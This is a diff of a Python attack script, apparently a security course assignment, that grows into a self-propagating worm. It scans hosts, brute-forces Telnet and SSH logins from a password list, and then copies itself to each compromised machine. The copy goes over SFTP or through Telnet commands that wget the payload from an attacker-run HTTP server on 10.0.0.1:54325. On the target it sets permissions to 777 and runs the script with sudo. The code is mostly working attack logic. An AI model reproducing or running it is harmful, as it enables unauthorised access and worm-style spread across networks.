@@ -4,7 +4,7 @@ from scapy.all import *
 from os import path
 from shutil import copyfile, rmtree
 from telnetlib import Telnet
-from paramiko import SSHClient, AutoAddPolicy, SFTPClient
+from paramiko import SSHClient, AutoAddPolicy, SFTPClient, SSHException, AuthenticationException
 from requests import get, post
 from http.server import HTTPServer, SimpleHTTPRequestHandler
 
@@ -36,9 +36,12 @@ def main():
     verify_file_exists(password_file)
     password_list = read_file_from_list(password_file)
 
-    # if "-d" in arguments:
-    #     deployment_file = arguments[arguments.index("-d") + 1]
-    #     deploy_file_to_server(deployment_file)
+    if "-d" in arguments:
+        deployment_file = arguments[arguments.index("-d") + 1]
+        deploy_file_to_server(deployment_file)
+
+    if "-L" in arguments and "-P" in arguments:
+        scan_for_active_ips()
 
     deployed = False
     print("[+] Received %d response(s). Beginning attack!\n" % len(ip_list))
@@ -61,9 +64,7 @@ def main():
                     print("Successfully logged into port %d with %s" % (port, username_password))
                     if port == 22 or port == 23 and not deployed:
                         credentials = username_password.split(":")
-                        print(credentials)
-                        deployed = transfer_file(ip, credentials[0], credentials[1],
-                                                 arguments[arguments.index("-d") + 1], False)
+                        deployed = transfer_file(ip, credentials[0], credentials[1], False, 23)
 
         print("********** %s **********\n" % ip)
 
@@ -79,17 +80,12 @@ def scan_port(ip, port):
 
 def bruteforce_telnet(ip, port, username, passwords):
     response = ""
-    server_number = int(ip.split(".")[3])
 
     login_prompt = encode_in_ascii("login:")
     username_input = encode_in_ascii("%s\n" % username)
     password_prompt = encode_in_ascii("Password:")
     welcome_output = encode_in_ascii("Welcome to")
-
-    cd_command = encode_in_ascii("cd /home/%s/assign_2/server_%d\n" % (username, server_number))
-    print(cd_command)
-    # dir_prompt = encode_in_ascii("%d>" % server_number)
-    wget_command = encode_in_ascii("[ ! -f .deploy ] && wget 10.0.0.1:54325/.deploy\n")
+    exit_command = encode_in_ascii("exit\n")
 
     for password in passwords:
         connection = Telnet(ip, port=port)
@@ -99,13 +95,9 @@ def bruteforce_telnet(ip, port, username, passwords):
         connection.write(encode_in_ascii("%s\n" % password))
         banner = connection.read_until(welcome_output, timeout=1)
         if welcome_output in banner:
-            #connection.write(cd_command)
-            # connection.read_until(dir_prompt, timeout=1)
-            #connection.write(wget_command)
+            connection.write(exit_command)
             connection.close()
-            # print(output)
-            # print(connection.read_all())
-            response = "%s:%s" % (username, password.rstrip())
+            response = "%s:%s" % (username, password)
             break
 
         connection.close()
@@ -115,47 +107,17 @@ def bruteforce_telnet(ip, port, username, passwords):
 
 def bruteforce_ssh(ip, port, username, passwords):
     response = ""
-    server_number = int(ip.split(".")[3])
-    cd_command = "cd /home/%s/assign_2/server_%d\n" % (username, server_number)
-    wget_command = "[ ! -f .deploy ] && wget 10.0.0.1:54325/.deploy\n"
-    ls_la_command = "ls -la\n"
-    exit_command = "exit\n"
     for password in passwords:
-        client = SSHClient()
         try:
+            client = SSHClient()
             client.set_missing_host_key_policy(AutoAddPolicy())
-            client.connect(ip, username=username, password=password, port=port)
-            # print("Test")
-            # sftp_client = client.open_sftp()
-            # local_dir = os.getcwd()
-            # local_path = "%s/%s" % (local_dir, "one_ip.txt")
-            # remote_dir = "/home/%s/assign_2/server_2" % username
-            # remote_path = "%s/%s" % (remote_dir, ".deploy")
-            # sftp_client.chdir(remote_dir)
-            # dir_contents = sftp_client.listdir()
-            # print(dir_contents)
-            # if ".deploy" not in dir_contents:
-            #     sftp_client.put(localpath=local_path, remotepath=remote_path)
-            #print("Contents " + str(sftp_client.listdir()))
-            #print(sftp_client)
-            #if sftp_client.getfo(".config"):
-            #    print("Got file")
-            #else:
-            #    sftp_client.put(".deploy")
-
-            # channel = client.invoke_shell()
-            # stdin = channel.makefile('wb')
-            # stdout = channel.makefile('rb')
-            #
-            # stdin.write('''%s %s %s %s''' % (cd_command, wget_command, ls_la_command, exit_command))
-            # print(stdout.read())
-            response = "%s:%s" % (username, password.rstrip())
+            client.connect(ip, username=username, password=password, port=port, timeout=3)
+            response = "%s:%s" % (username, password)
             break
-        except Exception as ex:
-            print(ex)
-            pass
-        finally:
-            client.close()
+        except:
+            print("Unable to establish SSH connection")
+
+        client.close()
 
     return response
 
@@ -188,25 +150,50 @@ def is_reachable(ip):
     return ans is not None
 
 
-def transfer_file(ip, username, password, deployment_file, overwrite_existing):
+def transfer_file(ip, username, password, overwrite_existing, port):
+    successful = False
+    target_directory = get_target_directory(ip, username)
+
+    if port == 22:
+        successful = transfer_file_with_sftp(ip, username, password, target_directory, overwrite_existing)
+    elif port == 23:
+        if scan_port(ip, 22):
+            try:
+                successful = transfer_file_with_sftp(ip, username, password, target_directory, overwrite_existing)
+            except:
+                print("Using HTTP")
+                successful = transfer_file_with_http_server(ip, username, password, target_directory,
+                                                            overwrite_existing, "")
+
+        else:
+            successful = transfer_file_with_http_server(ip, username, password, target_directory, overwrite_existing,
+                                                        "")
+
+    return successful
+
+
+def transfer_file_with_sftp(ip, username, password, target_directory, overwrite_existing):
     client = SSHClient()
     try:
         client.set_missing_host_key_policy(AutoAddPolicy())
         client.connect(ip, username=username, password=password)
         with client.open_sftp() as sftp_client:
+            deployment_filename = ".deploy"
+            script_filename = "net_attack.py"
+
             local_dir = os.getcwd()
-            local_path = "%s/%s" % (local_dir, deployment_file)
 
-            ip_octals = ip.split(".")
-            server_number = ip_octals[3]
-            remote_dir = "/home/%s/assign_2/server_%s" % (username, server_number)
-            remote_filename = ".deploy"
-            remote_path = "%s/%s" % (remote_dir, remote_filename)
+            local_deployment_path = "%s/%s" % (local_dir, deployment_filename)
+            local_script_path = "%s/%s" % (local_dir, script_filename)
+            target_deployment_path = "%s/%s" % (target_directory, deployment_filename)
+            target_script_path = "%s/%s" % (target_directory, script_filename)
 
-            sftp_client.chdir(remote_dir)
+            sftp_client.chdir(target_directory)
             dir_contents = sftp_client.listdir()
-            if remote_filename not in dir_contents or overwrite_existing:
-                sftp_client.put(localpath=local_path, remotepath=remote_path)
+            if deployment_filename not in dir_contents or overwrite_existing:
+                sftp_client.put(localpath=local_deployment_path, remotepath=target_deployment_path)
+                sftp_client.put(localpath=local_script_path, remotepath=target_script_path)
+                sftp_client.chmod(target_script_path, mode=777)
 
             return True
     except Exception as ex:
@@ -216,18 +203,129 @@ def transfer_file(ip, username, password, deployment_file, overwrite_existing):
         client.close()
 
 
+def transfer_file_with_http_server(ip, username, password, target_directory, overwrite_existing, self_propagate):
+    telnet_port = 23
+
+    login_prompt = encode_in_ascii("login:")
+    username_input = encode_in_ascii("%s\n" % username)
+    password_prompt = encode_in_ascii("Password:")
+    password_input = encode_in_ascii("%s\n" % password)
+    welcome_output = encode_in_ascii("Welcome to")
+
+    sudo_check = encode_in_ascii("id\n")
+    sudo_check_response = encode_in_ascii("27(sudo)")
+
+    wait_for = encode_in_ascii("saved")
+    cd_command = encode_in_ascii("cd %s\n" % target_directory)
+    # file_exists_command = encode_in_ascii("[ -f .deploy ] && echo ")
+    remove_old_file_if_exists_command = encode_in_ascii("[ -f .deploy ] && rm .deploy\n")
+    wget_deployment_file_command = encode_in_ascii("[ ! -f .deploy ] && wget 10.0.0.1:54325/.deploy -q\n")
+    wget_script_file_command = encode_in_ascii("[ ! -f net_attack.py ] && wget 10.0.0.1:54325/net_attack.py -q\n")
+
+    chmod_command = encode_in_ascii("sudo chmod +x net_attack.py\n")
+    sudo_prompt = encode_in_ascii("[sudo] password for %s:" % username)
+    start_net_attack_command = encode_in_ascii("sudo ./net_attack.py -n \n")
+
+    connection = Telnet(ip, port=telnet_port)
+    try:
+        connection.read_until(login_prompt)
+        connection.write(username_input)
+        connection.read_until(password_prompt)
+        connection.write(password_input)
+        banner = connection.read_until(welcome_output, timeout=1)
+        if welcome_output not in banner:
+            return False
+
+        connection.write(sudo_check)
+        check = connection.read_until(sudo_check_response, timeout=1)
+        if sudo_check_response not in check:
+            return False
+
+        connection.write(cd_command)
+        if overwrite_existing:
+            connection.write(remove_old_file_if_exists_command)
+        connection.write(wget_deployment_file_command)
+        connection.write(wget_script_file_command)
+        connection.read_until(wait_for, timeout=1)
+
+        connection.write(chmod_command)
+        sudo_response = connection.read_until(sudo_prompt, timeout=1)
+        if sudo_prompt in sudo_response:
+            connection.write(password_input)
+            connection.read_until(encode_in_ascii("WAIT_FOR"), timeout=1)
+        connection.write(start_net_attack_command)
+        out = connection.read_until(encode_in_ascii("password.txt"), timeout=5)
+        print(out)
+    except:
+        return False
+    finally:
+        connection.close()
+
+
+# def start_ssh_with_telnet_if_not_running(ip, port, username, password):
+#     ssh_port = 22
+#     if scan_port(ip, ssh_port):
+#         return True
+#
+#     login_prompt = encode_in_ascii("login:")
+#     username_input = encode_in_ascii("%s\n" % username)
+#     password_prompt = encode_in_ascii("Password:")
+#     password_input = encode_in_ascii("%s\n" % password)
+#     welcome_output = encode_in_ascii("Welcome to")
+#
+#     sudo_check = encode_in_ascii("id")
+#     sudo_check_response = "27(sudo)"
+#     start_sshd = encode_in_ascii("sudo service sshd start\n")
+#     sudo_prompt = encode_in_ascii("[sudo] password for %s:" % username)
+#
+#     connection = Telnet(ip, port=port)
+#     try:
+#         connection.read_until(login_prompt)
+#         connection.write(username_input)
+#         connection.read_until(password_prompt)
+#         connection.write(password_input)
+#         banner = connection.read_until(welcome_output, timeout=1)
+#         if welcome_output not in banner:
+#             return False
+#
+#         connection.write(sudo_check)
+#         check = connection.read_until(sudo_check_response, timeout=1)
+#         if sudo_check_response not in check:
+#             return False
+#
+#         connection.write(start_sshd)
+#         start_sshd = connection.read_until(sudo_prompt, timeout=1)
+#         if sudo_prompt in start_sshd:
+#             connection.write(encode_in_ascii("%s\n" % password))
+#             connection.read_until(encode_in_ascii("WAITING TO START"), timeout=5)
+#     except Exception as ex:
+#         print(ex)
+#         return False
+#     finally:
+#         connection.close()
+#
+#     return True
+
+
 def deploy_file_to_server(file):
     current_directory = os.getcwd()
-    current_file_location = "%s/%s" % (current_directory, file)
-    temp_directory = "%s/net_attack_deployment" % current_directory
-    file_name = ".deploy"
 
-    if path.isdir(temp_directory):
-        rmtree(temp_directory)
+    script_name = "net_attack.py"
+    deployment_file_name = ".deploy"
 
-    os.mkdir(temp_directory)
-    os.chdir(temp_directory)
-    copyfile(current_file_location, file_name)
+    current_deployment_file_location = "%s/%s" % (current_directory, file)
+    current_script_file_location = "%s/%s" % (current_directory, script_name)
+
+    deployment_directory = "%s/net_attack_deployment" % current_directory
+
+    if path.isdir(deployment_directory):
+        rmtree(deployment_directory)
+
+    os.mkdir(deployment_directory)
+    os.chdir(deployment_directory)
+
+    copyfile(current_deployment_file_location, deployment_file_name)
+    copyfile(current_script_file_location, script_name)
 
     server = ("", 54325)
     http = HTTPServer(server, SimpleHTTPRequestHandler)
@@ -244,6 +342,7 @@ def get_ports_from_input(ports_input):
         if port.isdigit():
             ports.append(int(port))
 
+    ports.sort()
     return ports
 
 
@@ -251,6 +350,18 @@ def verify_file_exists(file):
     if not path.isfile(file):
         print("Could not find file %s" % file)
         exit()
+
+
+def get_target_directory(ip, username):
+    ip_octals = ip.split(".")
+    server_number = int(ip_octals[3]) - 1
+    return "/home/%s/assign_2/server_%d" % (username, server_number)
+
+
+def scan_for_active_ips():
+    interfaces = get_if_list()
+    print(interfaces)
+    # Do Stuff
 
 
 def encode_in_ascii(s):
